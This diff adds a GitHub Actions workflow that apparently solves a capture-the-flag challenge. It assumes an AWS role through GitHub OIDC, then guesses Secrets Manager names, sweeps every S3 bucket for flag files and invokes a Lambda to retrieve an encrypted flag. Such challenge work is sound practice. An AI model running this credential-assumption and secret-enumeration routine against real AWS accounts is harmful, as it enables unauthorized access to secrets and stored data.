@@ -1,0 +1,41 @@
+name: Fetch Encrypted Flag
+
+on: workflow_dispatch
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  fetch:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS Credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
+          aws-region: us-east-1
+
+      - name: Retrieve Encrypted Flag
+        run: |
+          set -e
+
+          # Try Secrets Manager first (most likely)
+          echo "=== Trying Secrets Manager ==="
+          aws secretsmanager get-secret-value --secret-id encrypted-flag --query SecretString --output text || \
+          aws secretsmanager get-secret-value --secret-id flag --query SecretString --output text || \
+          aws secretsmanager get-secret-value --secret-id imagine --query SecretString --output text || \
+          echo "No secret found in Secrets Manager"
+
+          # Try S3
+          echo "=== Trying S3 ==="
+          aws s3 ls 2>/dev/null | while read line; do
+            bucket=$(echo "$line" | awk '{print $3}')
+            echo "Checking bucket: $bucket"
+            aws s3 cp "s3://$bucket/flag.enc" ./flag.enc 2>/dev/null && cat ./flag.enc && exit 0 || true
+            aws s3 cp "s3://$bucket/encrypted" ./encrypted 2>/dev/null && cat ./encrypted && exit 0 || true
+          done
+
+          # Try Lambda
+          echo "=== Trying Lambda ==="
+          aws lambda invoke --function-name get-flag /tmp/out.txt --cli-binary-format raw-in-base64-out && cat /tmp/out.txt || true
